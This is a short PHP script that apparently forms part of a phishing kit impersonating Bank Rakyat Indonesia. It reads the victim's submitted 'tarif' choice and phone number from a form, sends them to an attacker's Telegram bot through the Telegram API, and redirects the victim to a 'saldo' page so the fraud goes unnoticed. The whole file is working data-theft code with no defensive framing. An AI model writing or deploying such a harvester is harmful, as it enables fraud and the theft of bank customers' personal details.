<?php 



session_start();
include "./telegram.php";


$message = "<pre>┍─━━┑𝓑𝓪𝓷𝓴 𝓡𝓪𝓴𝔂𝓪𝓽 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪┍━━─┑</pre>". "<pre>\n". $_POST['tarif']. "</pre><pre>\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : ".  $_POST ['nohp']. "</pre>";
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 